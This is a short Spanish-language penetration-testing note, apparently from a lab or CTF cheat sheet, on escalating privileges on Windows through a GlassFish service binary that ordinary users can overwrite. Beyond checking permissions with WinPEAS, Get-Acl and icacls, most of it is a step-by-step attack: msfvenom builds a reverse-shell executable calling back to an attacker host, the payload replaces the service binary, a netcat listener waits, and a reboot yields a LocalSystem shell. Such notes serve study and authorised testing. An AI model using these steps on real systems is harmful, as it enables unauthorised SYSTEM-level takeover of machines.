# GlassFish 

Tags: #PrivEsc #Windows #SunGlassFish 


```powershell
Paso 1:
# Resultado con WinPEAS
File Permissions "C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe": Authenticated Users [WriteData/CreateFiles]

Paso 2:
# Confirmar que el servicio utiliza el binario y corre como LocalSystem
❯ Get-CimInstance Win32_Service | Select Name,StartName,PathName,State

    domain1    LocalSystem    C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe


Paso 3:
# Confirmar permisos
❯ Get-Acl C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe

Path               Owner                  Access
----               -----                  ------
domain1Service.exe BUILTIN\Administrators BUILTIN\Administrators Allow FullControl


# Confirmar permisos con icacls
❯ icacls "C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe"

C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe BUILTIN\Administrators:(I)(F)
                                                               NT AUTHORITY\SYSTEM:(I)(F)
                                                               BUILTIN\Users:(I)(RX)
                                                               NT AUTHORITY\Authenticated Users:(I)(M)
```

## Explotar
```bash 
Paso 1:
# Crear un payload malicioso en Kali
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=4848 -f exe -o domain1Service.exe

Paso 2:
# Hacer un backup del ejecutable original en Windows
❯ copy C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe C:\Temp\domain1Service.exe.bak

Paso 3:
# Subir el payload malicioso a Windows víctima

Paso 4:
# Copiar el payload a la ruta del servicio
❯ copy domain1Service.exe C:\glassfish4\glassfish\domains\domain1\bin\
```

```powershell 
Paso 5:
# Ponerse en escucha en Kali
❯ rlwrap nc -nlvp 4848

Paso 6:
# Reiniciar Windows
❯ shutdown /r /t 0

# Después del reinicio debería ejecutarse el servicio como LocalSystem y recibirse la reverse shell
```